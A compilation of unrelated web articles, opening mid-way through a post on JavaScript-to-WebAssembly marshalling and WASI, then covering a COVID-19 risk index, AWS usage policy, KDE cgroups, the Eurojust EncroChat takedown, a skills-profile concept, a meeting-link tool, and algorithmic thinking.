and WebAssembly. Here is how to create a binding for the function.</p>

<div><div><pre><code><span>const</span> <span>proto</span> <span>=</span> <span>new</span> <span>FunctionPrototype</span><span>(</span>
    <span>[</span>
        <span>new</span> <span>In</span><span>(</span><span>new</span> <span>ArrayType</span><span>(</span><span>new</span> <span>Float64Type</span><span>())),</span>
        <span>new</span> <span>In</span><span>(</span><span>new</span> <span>ArrayType</span><span>(</span><span>new</span> <span>Float64Type</span><span>())),</span>
        <span>new</span> <span>In</span><span>(</span><span>new</span> <span>Int32Type</span><span>())</span>
    <span>],</span>
    <span>new</span> <span>ArrayType</span><span>(</span><span>new</span> <span>Float64Type</span><span>(),</span> <span>4</span><span>))</span>
</code></pre></div></div>

<p>This matches the <code>C</code> prototype.</p>

<pre><code>__attribute__((used)) double* multipleFloat64ArraysReturningPtr (
    double* array1,
    double* array2, 
    int length)
</code></pre>

<p>Note that the return type also declares the length of the returned array. The
<code>C</code> function will only return a pointer to the start of the array, so we need
the length. In the real world we’d probably make a function out of prototypes
that require length parameters.</p>

<p>We can invoke the function as follows.</p>

<div><div><pre><code><span>const</span> <span>result</span> <span>=</span> <span>proto</span><span>.</span><span>invoke</span><span>(</span>
  <span>wasi</span><span>.</span><span>memoryManager</span><span>,</span>
  <span>wasi</span><span>.</span><span>instance</span><span>.</span><span>exports</span><span>.</span><span>multipleFloat64ArraysReturningPtr</span><span>,</span>
  <span>[</span><span>1</span><span>,</span> <span>2</span><span>,</span> <span>3</span><span>,</span> <span>4</span><span>],</span>
  <span>[</span><span>5</span><span>,</span> <span>6</span><span>,</span> <span>7</span><span>,</span> <span>8</span><span>],</span>
  <span>4</span><span>)</span>
</code></pre></div></div>

<p>As well as the function arguments we provide <code>wasi.memoryManager</code> to allow
access to the WebAssembly memory and <code>wasi.instance</code> to retirve the function.</p>

<p>When the function is invoked three things happen. First the input arguments are
<em>marshalled</em>. Memory is allocated for each array, and the array data is copied
into that memory. The integer value can be passed directly.</p>

<p>Second the function is called with the marshalled aruments and the return value
is received.</p>

<p>Third the memory for the input arguments is freed, the result value is copied
from the WebAssembly memory to a JavaScript array, and the memory that was
allocated inside the WebAssembly instance is freed.</p>

<h2 id="memory">Memory</h2>

<p>While not strictly part of WASI, memory management is the first problem to
solve. When a WebAssembly module is instatiated a memory buffer is either
passed, or created by the instance. When using the WASM standard library
provided by <a href="https://github.com/WebAssembly/wasi-libc">wasi-libc</a> the memory
management functions <code>malloc</code> and <code>free</code> can be exported from the instance.</p>

<p>After instantiation they are held in the following class.</p>

<div><div><pre><code><span>class</span> <span>MemoryManager</span> <span>{</span>
  <span>constructor</span> <span>(</span><span>memory</span><span>,</span> <span>malloc</span><span>,</span> <span>free</span><span>)</span> <span>{</span>
    <span>this</span><span>.</span><span>memory</span> <span>=</span> <span>memory</span>
    <span>this</span><span>.</span><span>malloc</span> <span>=</span> <span>malloc</span>
    <span>this</span><span>.</span><span>free</span> <span>=</span> <span>free</span>
    <span>this</span><span>.</span><span>dataView</span> <span>=</span> <span>new</span> <span>DataView</span><span>(</span><span>this</span><span>.</span><span>memory</span><span>.</span><span>buffer</span><span>)</span>
  <span>}</span>
<span>}</span>
</code></pre></div></div>

<p>An array of floats might be marshalled as follows.</p>

<div><div><pre><code><span>function</span> <span>marshallFloat64Array</span><span>(</span><span>memoryManager</span><span>,</span> <span>array</span><span>)</span> <span>{</span>
  <span>const</span> <span>address</span> <span>=</span> <span>memoryManager</span><span>.</span><span>malloc</span><span>(</span><span>Float64Array</span><span>.</span><span>BYTES_PER_ELEMENT</span> <span>*</span> <span>array</span><span>.</span><span>length</span><span>)</span>
  <span>const</span> <span>typedArray</span> <span>=</span> <span>new</span> <span>Float64Array</span><span>(</span><span>memoryManager</span><span>.</span><span>memory</span><span>.</span><span>buffer</span><span>,</span> <span>address</span><span>,</span> <span>array</span><span>.</span><span>length</span><span>)</span>
  <span>typedArray</span><span>.</span><span>set</span><span>(</span><span>array</span><span>)</span>
  <span>return</span> <span>address</span>
<span>}</span>
</code></pre></div></div>

<p>An array that was allocated inside the WebAssembly instance might be
unmarshalled as follows.</p>

<div><div><pre><code><span>function</span> <span>unmarshallFloat64Array</span><span>(</span><span>memoryManager</span><span>,</span> <span>address</span><span>,</span> <span>length</span><span>)</span> <span>{</span>
  <span>try</span> <span>{</span>
    <span>const</span> <span>typedArray</span> <span>=</span> <span>new</span> <span>Float64Array</span><span>(</span><span>memoryManager</span><span>.</span><span>memory</span><span>.</span><span>buffer</span><span>,</span> <span>address</span><span>,</span> <span>length</span><span>)</span>
    <span>return</span> <span>Array</span><span>.</span><span>from</span><span>(</span><span>typedArray</span><span>)</span>
  <span>}</span> <span>finally</span> <span>{</span>
    <span>memoryManager</span><span>.</span><span>free</span><span>(</span><span>address</span><span>)</span>
  <span>}</span>
<span>}</span>
</code></pre></div></div>

<h2 id="our-second-c-function">Our Second C Function</h2>

<p>Here is our second <code>C</code> function.</p>

<pre><code>__attribute__((used)) void multipleFloat64ArraysWithOutputArray (double* array1, double* array2, double* result, int length)
{
  for (int i = 0; i &lt; length; ++i) {
    result[i] = array1[i] + array2[i];
  }
}
</code></pre>

<p>This time the calling function allocates the memory for the output array and
passes it in.</p>

<h2 id="our-second-javascript-function-prototype">Our Second JavaScript Function Prototype</h2>

<p>The JvaScript function prototype looks as follows.</p>

<div><div><pre><code><span>const</span> <span>proto2</span> <span>=</span> <span>new</span> <span>FunctionPrototype</span><span>(</span>
  <span>[</span>
    <span>new</span> <span>In</span><span>(</span><span>new</span> <span>ArrayType</span><span>(</span><span>new</span> <span>Float64Type</span><span>())),</span>
    <span>new</span> <span>In</span><span>(</span><span>new</span> <span>ArrayType</span><span>(</span><span>new</span> <span>Float64Type</span><span>())),</span>
    <span>new</span> <span>Out</span><span>(</span><span>new</span> <span>ArrayType</span><span>(</span><span>new</span> <span>Float64Type</span><span>())),</span>
    <span>new</span> <span>In</span><span>(</span><span>new</span> <span>Int32Type</span><span>())</span>
  <span>]</span>
<span>)</span>
</code></pre></div></div>

<p>We don’t need to provide a return type as nothing is returned. The <em>output</em>
argument is wrapped in an <code>Out</code> class to inform the marshaller to unpack it
after the function is called.</p>

<p>The function is called as follows.</p>

<div><div><pre><code><span>const</span> <span>output</span> <span>=</span> <span>new</span> <span>Array</span><span>(</span><span>4</span><span>)</span>
<span>proto2</span><span>.</span><span>invoke</span><span>(</span>
  <span>wasi</span><span>.</span><span>memoryManager</span><span>,</span>
  <span>wasi</span><span>.</span><span>instance</span><span>.</span><span>exports</span><span>.</span><span>multipleFloat64ArraysWithOutputArray</span><span>,</span>
  <span>[</span><span>1</span><span>,</span> <span>2</span><span>,</span> <span>3</span><span>,</span> <span>4</span><span>],</span>
  <span>[</span><span>5</span><span>,</span> <span>6</span><span>,</span> <span>7</span><span>,</span> <span>8</span><span>],</span>
  <span>output</span><span>,</span>
  <span>4</span><span>)</span>
</code></pre></div></div>

<p>Because we supplied the output array with the correct length, we didn’t need
to supply a length argument to <code>ArrayType</code>.</p>

<h2 id="wheres-wasi">Where’s WASI?</h2>

<p>So far there’s been no need for WASI. That ends with strings.</p>

<p>WASI enters the picture when we need to leave the WebAssembly sandbox and
interact with the system in which we’re running. It’s not obvious why this
should happen with strings. In JavaSCript strings use UTF-8. As soon
as we need to decode a string the C standard library will want to know about
our <em>locale</em> (our language environment). To do this it it checks the environment
variables, which exist outside the sandbox!</p>

<p>This introduces the first of our system call requirement: <code>environ_sizes_get</code>
and <code>environ_get</code>. The first call finds the amount of space required to store
the environment variables; the second fetches them.</p>

<p>The other need for WASI is when the code interacts with stdout/stderr. While
we might think this is unnecessary, it is common for C libraries to report
errors through the <code>perror</code> function which returns and error and reports the
cause to stderr.</p>

<p>There are a small bunch of functions we need to support here. The final outcode
is the following set of imports to the WebAssembly.</p>

<h2 id="thoughts">Thoughts</h2>

<p>We’ve got a ganeric marshalling layer between JavaScript and WebAssembly which
is pretty cool! We’ve also got enough WASI to drop in publically available
<code>C</code> libraries.</p>

<p>We’ve not yet addressed C++ libraries and we’re waiting for the <code>flang</code> compiler
to be incorporated into the <code>llvm</code> toolchain, so there’s a way to go before we
have access to everything we need to use JavaSCript to do real work with
native libraries.</p>

	With no clear direction from the federal government on how to handle the COVID-19 pandemic, it’s been hard to decide what’s safe and unsafe as states begin to open up. There's no right answer; you just need to know the risks and how much risk you're willing to take. That's why Professor Saskia Popescu, an infectious disease epidemiologist at the University of Arizona,&nbsp;Dr. James P. Phillips, MD, the Chief of Disaster Medicine at GWU Emergency Medicine, and I developed a COVID-19 Risk Index to help you do this, based on four key factors:</p>
<p>
	1) Enclosed space</p>
<p>
	2) Duration of interaction</p>
<p>
	3) Crowds</p>
<p>
	4) Forceful exhalation&nbsp; &nbsp;</p>
<p>
	Again, we hope this Risk Index is helpful to you as you decide what you are comfortable doing as these activities become available. We created this as a public service, so please feel free to tweet, post, e-mail, and print and hang this on your refrigerator&nbsp;or around your workplace. You can download the infographic <a href="https://www.dropbox.com/s/t2ecgl0wur1kyzp/COVID-19%20risk%20infographic_final.pdf?dl=0">here</a></p>

I actually quite like AWS and its offerings. I’m making this post because I’m genuinely curious
how to interpret the <a href="https://aws.amazon.com/aup/">AWS Acceptable Use Policy</a>. The static content for this blog is hosted within an
AWS S3 bucket. Does saying “Fuck You AWS” constitute offensive content?</p>

<p>The section titled ‘No Illegal, Harmful, or Offensive Use or Content’ says:</p>

<blockquote>
  <p>You may not use, or encourage, promote, facilitate or instruct others to use, the Services or AWS Site for any illegal, harmful, fraudulent, infringing or offensive use, or to transmit, store, display, distribute or otherwise make available content that is illegal, harmful, fraudulent, infringing or offensive. Prohibited activities or content include:</p>
</blockquote>

<blockquote>
  <p>Offensive Content. Content that is defamatory, obscene, abusive, invasive of privacy, or otherwise objectionable, including content that constitutes child pornography, relates to bestiality, or depicts non-consensual sex acts.</p>
</blockquote>

<p>“Otherwise objectionable” seems to cast a very wide net.
One of my <a href="http://thoughts.josephdeon.me/2020/07/01/hello-weblog.html">three goals</a> for self hosting this blog was ownership. To me part of
ownership is being able to express myself freely. I hoped that meant as
long as I worked within the confines of the law I would be in the clear.</p>

<p>If this post gets removed then I know I have not fully achieved my ownership goal and it
might be time to just host on a pi.</p>

<p><br>
P.S. I posted this to hackernews. It made it to the front page and generated <a href="https://news.ycombinator.com/item?id=23717254">some discussion</a>.</p>

	<!-- .entry-header -->

	<div>
		<p>A desktop environment's sole role is to connect users to their applications. This includes everything from launching apps to actually displaying apps but also managing them and making sure they run fairly. Everyone is familiar the concept of a "Task manager" (like ksysguard), but over time they haven't kept up with the way applications are being developed or the latest developments from Linux.</p>

<h2>Managing running processes</h2>
<p>There used to be a time where one PID == one "application". The kwrite process represents Kwrite, the firefox process represents Firefox, easy. but this has changed. To pick an extreme example:<br>
<strong>Discord in a flatpak is 13 processes!</strong></p>
<p>It basically renders our task manager's process view unusable. All the names are random gibberish, trying to kill the application or setting nice levels becomes a guessing game.  Parent trees can help, but they only get you so far.</p>
<p>It's unusable for me, it's probably unusable for any user and gets in the way of feeling in control of your computer.</p>
<p>We need some metadata.</p>
<h2>Fair resource distribution</h2>
<p>As mentioned above discord in a flatpak is 13 processes. Krita is one process.</p>
<ul>
<li>One will be straining the CPU because it is a highly sophisticated application doing highly complicated graphic operations</li>
<li>One will be straining the CPU because it's written in electron</li>
</ul>
<p>To a kernel scheduler all it would see are 14 opaque processes. It has no knowledge that they are grouped as two different things. It won't be able to come up with something that's fair.</p>
<p>We need some metadata.</p>
<p>(caveat: Obviously most proceses are idling, and I've ignored threads for the purposes of making a point, don't write about it)</p>
<h2>It's hard to map things</h2>
<p>Currently the only metadata of the "application" is on a window.  To show a user friendly name and icon in ksysguard (or any other system monitor) we have to fetch a list of all processes, fetch a list of all windows and perform a mashup. Coming up with arbitrary heuristics for handling parent PIDs which is unstable and messy.</p>
<p>To give some different real world examples:</p>
<ul>
<li>In plasma's task manager we show an audio indicator next to the relevant window, we do this by matching PIDs of what's playing audio to the PID of a window. Easy for the simple case... however as soon as we go multi-process we have to track the parent PID, and each "fix" just alternates between one bug and another.</li>
<li>With PID namespaces apps can't correctly report client PIDs anymore.</li>
<li>We lose information on what "app" we've spawned. We have bug reports where people have two different taskmanager entries for "Firefox" and "Firefox (nightly)" however once the process is spawned that information is lost - the application reports itself as one consistent name and our taskbar gets confused.</li>
</ul>
<p>We need some metadata.</p>

<h2>This is a solved problem!</h2>
<p>A modern sysadmin doesn't deal in processes, but cgroups. The cgroup manager (which will be typically systemd) spawns each service as one cgroup. It uses cgroups to know what's running, the kernel can see what things belong together. </p>
<p>On the desktop flatpaks will spawn themselves in cgroups so that they can use the relevant namespace features.</p>
<p>You're probably already using cgroups. As part of a <a href="https://systemd.io/DESKTOP_ENVIRONMENTS">cross-desktop effort</a> we want to bring cgroups to the entire desktop.</p>
<h2>Example</h2>
<p>Before and after of our system monitor<br>
<a href="http://blog.davidedmundson.co.uk/wp-content/uploads/2020/12/old1.png"><img src="http://blog.davidedmundson.co.uk/wp-content/uploads/2020/12/old1.png" alt=""></a></p>
<p><a href="http://blog.davidedmundson.co.uk/wp-content/uploads/2020/12/ksysguardqml_apps.png"><img src="http://blog.davidedmundson.co.uk/wp-content/uploads/2020/12/ksysguardqml_apps-1024x772.png" alt=""></a></p>
<p>Ultimately the same data but way easier to read..</p>

<p>Another key part of cgroup usage is the concept of slices. Cgroups are based on a heirachical structure, with slices as logical places to split resource usage. We don't adjust resources globally, we adjust resources within our slice, which then provides information to the scheduler.</p>
<p><a href="http://blog.davidedmundson.co.uk/wp-content/uploads/2020/12/treepie.png"><img src="http://blog.davidedmundson.co.uk/wp-content/uploads/2020/12/treepie.png" alt=""></a></p>
<p>Conceptually you can imagine that we just adjust resources within our level of a tree. Then the kernel magically takes care of the rest.</p>
<p>More information can be found on slices in this excellent series <a href="https://www.redhat.com/en/blog/world-domination-cgroups-part-2-turning-knobs"> World domination with cgroups</a>.</p>
<h2>Default slices</h2>
<p>This means we can set up some predefined slices. Within the relevant user slice this will consist shared of</p>
<ul>
<li>applications</li>
<li>the system (kwin/mutter, plasmashell)</li>
<li>background services (baloo, tracker)</li>
</ul>
<p>Each of these slices can be given some default prioritisations and OOM settings out of the box.</p>
<h2>Dynamic resource shifting</h2>
<p>Now that we are using slices, and only adjusting our relative weight within the slice, we can shift resource priority to the application owning the focused window.</p>
<p>This only has any effect if your system is running at full steam from mulitple sources at once, but it can provide a slicker response at no drawback.</p>
<h2>Why slice, doesn't nice suffice?</h2>
<p>Nice is a single value, global across the entire system. Because of this user processes can only be lowered, but never raised to avoid messing with the system.  With slices we're only adjusting relative weight compared to services within our slice. So it's safe to give the user full control within their slice. Any adjustments to an application, won't impact system services or other users.</p>
<p>It also doesn't conflict with nice values set by the application explicitly. If we set kdevelop to have greater CPU weight, clang won't suddenly take over the whole computer when compiling.</p>

<h2>CGroup extra features</h2>
<p>CGroup's come with a lot of new features that aren't available on a per-process level. </p>
<p>We can:</p>
<ul>
<li>Set limits so that a CPU can't use more than N% </li>
<li>We can gracefully close processes on logout</li>
<li>We can disable networking</li>
<li>We can set memory limits</li>
<li>We can prevent forkbombs</li>
<li>We can provide hints to the OOM killer not just with a weight but with expected ranges that should be considered normal</li>
<li>We can freeze groups of processes (which will be useful for Plasma mobile)<br>
... </li>
</ul>
<p>All of this is easy to add for a user / system administrator. Using drop in's one can just add a .service file [example file link] to ~/.config/systemd/user.control/app-firefox@.service and manipulate any of these.</p>
<p>[caveat, some of those features works for applications created as new transient services, not the lite version using scopes that's currently merged in KDE/Gnome - maybe worth mentioning]</p>

<p>Plasma 5.19 and recent Gnome now spawn applications into respective cgroups, but we're not yet surfacing the results that we can get from this.</p>
<p>For the KDE devs providing the metadata is easy.</p>
<p>If spawning a new application from an existing application be sure to use either <a href="https://api.kde.org/frameworks/kio/html/classKIO_1_1ApplicationLauncherJob.html"><code>ApplicationLauncherJob</code></a> or <a href="https://api.kde.org/frameworks/kio/html/classKIO_1_1CommandLauncherJob.html"><code>CommandLauncherJob</code></a> and set the respective service. Everything else is then handled automagically. You should be using these classes anyway for spawning new services.</p>
<p>For users, you can spawn an application with either <code><code>kstart5 --application foo.desktop"</code></code></p>
<p>That change to the launching is relatively tiny, but getting to this point in Plasma wasn't easy - there were a lot of edge cases that messed up the grouping correctly.</p>
<ul>
<li>kinit, our zygote process really meddled with keeping things grouped correctly</li>
<li>drkonqi, our crash handler and application restarter</li>
<li>dbus activation has no knowledge of the associated .desktop file if an application is DBus activated (such as spectacle our screenshot tool)</li>
<li>and many many more papercuts throughout of different launches</li>
</ul>
<p>Also to fully capitalise on slices we need to move all our background processes into managed services and slices. This is worthy of another (equally lengthy) blog post.</p>
<h2>How you can help?</h2>
<p>It's been a battle to find these edge cases.<br>
Whilst running your system, please run systemd-cgls and point out any applications (not background services yet) that are not in their appropriate cgroup.</p>

<p>(e.g BSD users)</p>
<p>As we're just adding metadata, everything used now will continue to work exactly as it does now. All existing tools work exactly the same. Within our task manager we still will keep a process view (it's still useful regardless) and we won't put in any code that relies on the cgroup metadata present. We'll keep the existing heuristics for matching windows with external events, cgroup metadata would just be a strongly influence factor in that. Things won't get worse, but we won't be able to capitalise on the new features discussed here, </p>

<p><img src="http://www.eurojust.europa.eu/press/PressReleases/PublishingImages/2020-07-02_PR.jpg" alt=""></p><p><span>The Hague, 2 July 2020</span></p>


<p><strong>At a joint press conference today, French and Dutch law enforcement and judicial authorities, Europol and Eurojust presented the impressive results of a joint investigation team to dismantle EncroChat, an encrypted phone network widely used by criminal networks. </strong></p>
<p><strong>Over the last months, the joint investigation made it possible to intercept, share and analyse millions of messages that were exchanged between criminals to plan serious crimes. For an important part, these messages were read by law enforcement in real time, over the shoulder of the unsuspecting senders. </strong></p>
<p><strong>The information has already been relevant in a large number of ongoing criminal investigations, resulting in the disruption of criminal activities including violent attacks, corruption, attempted murders and large-scale drug transports. Certain messages indicated plans to commit imminent violent crimes and triggered immediate action. The information will be further analysed as a source of unique insight, giving access to unprecedented volumes of new evidence to profoundly tackle organised criminal networks.  </strong></p>

<p>In recent years, European countries have been increasingly affected by organised crime groups who are pervasive and highly adaptive, posing one of the most pressing security challenges faced by law enforcement and judicial authorities. In this regard, the abuse of the encrypted communication technologies is a key facilitator of their criminal activities.</p>
 

<p>Since 2017, the French <em>Gendarmerie </em>and judicial authorities have been investigating phones that used the secured communication tool EncroChat, after discovering that the phones were regularly found in operations against organised crime groups and that the company was operating from servers in France. Eventually, it was possible to put a technical device in place to go beyond the encryption technique and have access to the users' correspondence.</p>

<p>In early 2020, EncroChat was one of the largest providers of encrypted digital communication with a very high share of users presumably engaged in criminal activity. User hotspots were particularly present in source and destination countries for cocaine and cannabis trade, as well as in money laundering centres.</p>
 

<p><a href="http://www.eurojust.europa.eu/doclibrary/corporate/Infographics/The%20dismantling%20of%20an%20encrypted%20phone%20solution%20used%20by%20organised%20crime%20groups%2c%202020/2020-07_Infographic-Encrochat-Case.pdf" target="_blank"><img src="http://www.eurojust.europa.eu/press/PressReleases/PublishingImages/2020-07-02_PR-infographic-thumbnail.png" alt=""></a>Given the widespread use of the encrypted telephone solution by EncroChat among international criminal networks around the world, French authorities decided to open a case at Eurojust, the EU Agency for Criminal Justice Cooperation, towards the Netherlands in 2019. Further developments in the investigations led to organising the processing of the data, which was captured on the basis of the provisions of French law and with judicial authorisation, through the frameworks for international judicial and law enforcement cooperation. [<em>Click on image to enlarge</em>].</p>

<p>The data was in first instance shared with the Netherlands. Eurojust facilitated the creation of a joint investigation team (JIT) between the two countries and with the participation of Europol, the European Union Agency for Law Enforcement Cooperation, in April 2020. </p>

<p>Europol has been actively involved in the investigations led by France and the Netherlands since 2018, relating to the provision and use of encrypted communication services by organised crime groups. Through its role as an information hub and its extensive analytical and technical support system, Europol was able to create and provide a unique and global insight on the scale and functioning of organised crime, as a result of this investigation. This will help law enforcement to combat organised crime in the future more successfully. Europol’s support from the early stages of this JIT included: promoting and arranging international cooperation, providing extensive analytical and financial support, technical expertise and a secured platform for the exchange of information between the countries involved.  A large dedicated team at Europol investigated in real time millions of messages and data that it received from the JIT partners during the investigation, cross-checked and analysed the data, and provided and coordinated with the JIT partners the information exchange to concerned countries.</p>

<p><img src="http://www.eurojust.europa.eu/press/PressReleases/PublishingImages/2020-07-02_PR_GendarmerieNationale.jpg" alt="">A large number of suspects have also been arrested in several countries which were not participating in the JIT but particularly affected by the illegal use of these phones by individuals active in organised crime, including in the UK, Sweden and Norway. Many of these investigations were connected with international drug trafficking and violent criminal activities.</p>

<p>At the same time, numerous operational meetings for the daily coordination between the law enforcement entities of the JIT partners and other countries took place at Europol, partly during COVID-19.</p>

<p>Eurojust intensively facilitated the judicial cooperation, during the extensive use of European judicial cooperation instruments such as European Investigation Orders. Throughout the investigation, the JIT members organised five coordination meetings at Eurojust to bring all involved parties together in a secure environment, identify parallel or linked investigations, decide on the most suitable framework for cooperation and solve potential conflicts of jurisdiction.  </p>

<p>In France, where the operation takes place under the code name "Emma 95", the Gendarmerie has set-up a Taskforce since March 2020. With more than 60 officers, the Gendarmerie leads the investigations targeting the EncroChat encrypted telephone solution under the supervision of the magistrates of the JIRS of Lille. The Taskforce has been monitoring the communications of thousands of criminals, leading to the opening of a wide range of incidental proceedings. France does not wish to communicate further on these on-going investigations nor on the results obtained. The considerable resources deployed demonstrate the importance of these investigations and the importance attached to their success in France. </p>

<p>In the Netherlands, where the operation went under the code name “Lemont”, hundreds of investigators have, with authorisation of the examining magistrate, followed the communications of thousands of criminals day and night since the operation began to unravel and act on the intercepted data stream. The criminal investigation has been led by prosecutors from the Dutch National Public Prosecution Service and the information has been made available to about a hundred ongoing criminal investigations. The investigation has so far led to the arrest of 60 suspects, the seizure of drugs (more than 10 000 kilo cocaine, 70 kilo heroin, 12 000 kilo cannabis, 1 500 kilo crystal meth and 160 000 liter of a substance used to produce synthetic drugs), the dismantling of 19 synthetic drugs labs, the seizure of dozens of (automatic) fire weapons, expensive watches and 25 cars, including vehicles with hidden compartments, and almost EUR 20 million in cash. The expectation is that information will be made available in more than 300 investigations. In a number of cases, more arrests are very likely to follow in the coming period. </p>

<p>The interception of EncroChat messages came to an end on 13 June 2020, when the company realised that a public authority had penetrated the platform. EncroChat then sent a warning to all its users with the advice to immediately throw away the phones.</p>
 

<p>While the activities on EncroChat have been stopped, this complex operation shows the global scope of serious and organised crime and the connectivity of criminal networks who use advanced technologies to cooperate on a national and international level. The effects of the operation will continue to echo in criminal circles for many years to come, as the information has been provided to hundreds of ongoing investigations and, at the same time, is triggering a very large number of new criminal investigations of organised crime across the European continent and beyond. </p>

<p><strong>What is EncroChat?</strong></p>

 
<p><img src="http://www.eurojust.europa.eu/press/PressReleases/PublishingImages/2020-07-02_encrochat.png" alt="">EncroChat phones were presented to customers as guaranteeing perfect anonymity (no device or SIM card association on the customer's account, acquisition under conditions guaranteeing the absence of traceability) and perfect discretion both of the encrypted interface (dual operating system, the encrypted interface being hidden so as not to be detectable) and the terminal itself (removal of the camera, microphone, GPS and USB port). It also had functions intended to ensure the ‘impunity’ of users (automatic deletion of messages on the terminals of their recipients, specific PIN code intended for the immediate deletion of all data on the device, deletion of all data in the event of consecutive entries of a wrong password), functions that apparently were specially developed to make it possible to quickly erase compromising messages, for example at the time of arrest by the police. In addition, the device could be erased from a distance by the reseller/helpdesk.</p>

<p>EncroChat sold the cryptotelephones (at a cost of around EUR 1 000 each) at international scale and offered subscriptions with a worldwide coverage, at a cost of 1 500 EUR for a six-month period, with 24/7 support.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Some MuchSkills users must be wondering why we ask them to list their ‘job focus’ instead of ‘job title’. I’ve also been asked to define what we mean by ‘job focus’ by some of you, so I thought it might be good to explain what we mean by the concept here.</p><p>We wanted a term that helped us convey two things about ourselves to others:</p><ul role="list"><li>The skills we are proficient in.</li><li>The skills we are keen on using – those that energise us.</li></ul><p>The term ‘job title’ didn’t work for us for two reasons. One, it doesn’t tell us much about the skills people actually use during their work or about a person’s interest in deploying those skills. Two, we felt job titles were a throwback to an old order where titles were used as currency, indicating a person’s status in the hierarchy, and we believe modern egalitarian and collaborative workplaces don’t really need such hierarchies.</p><p>That inspired us to coin the term ‘job focus’.</p><p>At MuchSkills, we’d like to define ‘job focus’ as<strong>:</strong><em> “The value we bring to our colleagues and workplaces that is connected to our personal interests, values and competences.”</em></p><p>To record your ‘job focus’ on MuchSkills, you must answer these two simple questions: What is it that I’m good at? What is it that energizes me?</p><p>Let’s use my ‘job focus’ as an example.</p><p>It reads: Digital Strategy &gt; Business Strategy &gt; Digital Transformation &gt; User Experience Design &gt; UI Design &gt; Storytelling &gt; Design Thinking &gt; Sales.&nbsp;</p><p>These skills are arranged in order of importance – from top to bottom. The MuchSkills interface allows you to do this by increasing or decreasing the sizes of each bubble.</p><figure id="w-node-f7a825d2da2c-ba81df3a"><p><img src="https://uploads-ssl.webflow.com/5dc27bf865f41cedb4b7b9a5/5ef35e2952537cab4fe9f40a_MuchSkillls%20-%20Noel.png" alt="Noel Braganza on MuchSkills - Job Focus, Soft Skills, Technical Skills profile"></p></figure><p>On the other hand, my job title is: Digital Product Designer. This title doesn’t tell you that there are so many other skills I am proficient in and enjoy working with.&nbsp;&nbsp;</p><p>It’s the same story with so many other job titles.</p><p>Do remember that the emphasis of ‘job focus’ is on both “proficiency” <em>and</em> “interest”. If you are good at a particular skill, but aren’t really keen on using it now or in the future, you shouldn’t list it under ‘job focus’.</p><p>Before I entered the world of Digital Product Design, for instance, I was a copywriter and happened to be a good one too. Today if I ask myself what I am proficient in, one of the answers will be ‘copywriting’. But copywriting isn’t what interests or energises me today. It is not something I want to work with in the future. So I do not list it under ‘job focus’.</p><p><strong>The secret to staying engaged at work</strong></p><p>In my opinion, ‘job focus’ tells people – whether colleagues or hiring managers – way more about us and our capabilities than a CV or ‘job title’ can.</p><p>We believe this is important knowledge for hiring managers or team managers because when employees put their ‘job focus’ out there so that everyone can see the strengths they enjoy using at work, employers can use that information to match them with the right projects.</p><p>Why is this important?</p><p>Three words:<a href="https://www.muchskills.com/blog/are-engaged-employees-more-productive"> Increased employee performance</a>.</p><p>A<a href="http://selfdeterminationtheory.org/wp-content/uploads/2017/03/2014_Dubreuil_etal_JofPosPsych.pdf"> 2014 study</a> published in <em>The Journal of Positive Psychology</em> validated the association between the use of an individual’s strengths and work performance. “…[E]ncouraging strengths identification, use, and development in human management practices can be an excellent way to promote work performance, thereby stimulating passion, vitality, and concentration at work,” the study concluded.</p><p>Gallup’s<a href="https://www.gallup.com/workplace/238085/state-american-workplace-report-2017.aspx"> <em>State of the American Workplace</em></a> report published in 2017 also found that workers want roles and employers that allow them to make the most of their strengths. “Employees do their best in roles that enable them to integrate their talent (the natural capacity for excellence), skills (what they can do) and knowledge (what they know),” it said.</p><p>That’s not all.</p><p>The ‘job focus’ concept acknowledges that skills and interests change over time. There may be times when you upskill or find you are interested in developing an existing or new skill. The MuchSkills ‘job focus’ tab allows you to capture that by enabling you to increase or decrease the size of the bubble with that particular skill. All this is instantly visible to colleagues, managers and even recruiters (if you make your profile public).</p><p>So go ahead and list your ‘job focus’ now.<br></p></div></div>]]>

<p>Today we are excited to share <a href="https://now.me/">now.me</a> -- a way to get right to the meeting you're supposed to be in right now.  At any given moment, if you visit the site, it will look at your calendar, see what video call you're meant to be in, and take you right there.  It works with most video call providers, including Zoom, Google Meet, Whereby, team.video, and others.  We have been using this tool internally for a while now, and thought we might as well share it with the world.</p>
<p>In a way it seems like a small problem to solve.  It's not so hard to open up your calendar, find the meeting you're supposed to be in, find the link to it, and open it up.  But at that moment when it's time to get together with your clients or colleagues, that time is precious. We want those brain cycles in to go toward preparing for the conversation that is about to take place.  Especially if we're running late, or if we're trying to get together materials to share, or deep in thought pondering whatever trade-offs we are about to weigh -- it can make a big difference not to have to context-switch at that moment.</p>
<p>As we use now.me, we find ourselves dreaming of next iterations: Beautiful as it is in its current state, it could be nice to add support for custom themes where we could set our own images, or toggle dark mode.  Another idea we've pondered is an option to keep a now.me tab open, and then when a meeting is about to start, it would show a notification and even automatically join the meeting in a new tab, with no interaction required.</p>
<p>We'd love to hear your feedback!  Try it out at <a href="https://now.me/">https://now.me</a></p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>In this posting we will discuss <strong>algorithmic thinking</strong> and try to propose a way of thinking that might become helpful when trying to solve a problem that does not have an obvious solution and some level of <strong>improvisation</strong> is required.</p>
<p>Based on my experience the three most important qualities of a programmer can be summarized as follows:</p>
<ul>
<li>Algorithmic thinking.</li>
<li>Code design.</li>
<li>Mastery of the language of choice.</li>
</ul>
<p>The ability to solve problems that require the <strong>invention</strong> of a new algorithm combined with the skill of recognizing cases that can be solved directly by a “standard” one is one of the strongest signs of programming expertise and talent.</p>
<p>Although it is true that the need to create a brand new algorithm does not appear often in our days, it is also equally true that a programmer who has the ability to successfully <strong>combine analytic and synthetic thinking</strong> and efficiently solve a multi-dimensional problem will probably be proven to be more effective than somebody who does not.</p>
<p>Out of the three types of skills that I am mentioning above the one that requires the most <strong>programming talent</strong> is without a doubt the <strong>Algorithmic thinking</strong>; the most successful software companies are convinced about the the truth of this statement and this is why algorithms lie in the core of their interviewing processes.</p>
<p>Although talent is definitely required in most cases it is not enough when facing a new problem; we can certainly be assisted by some “methodical” steps that can serve as the blueprint for the creation of a solution and discussing them is the topic of this posting.</p>
<p>A summary of these “methodical” steps that I am usually following whenever I have to deal with an original problem is the following:</p>
<ul>
<li>Articulate the problem with clarity and try to understand niche cases.</li>
<li>Creating several sets of testing input – output</li>
<li>Code at least one brutal force solution</li>
<li>Study the problem trying to understand it in depth.</li>
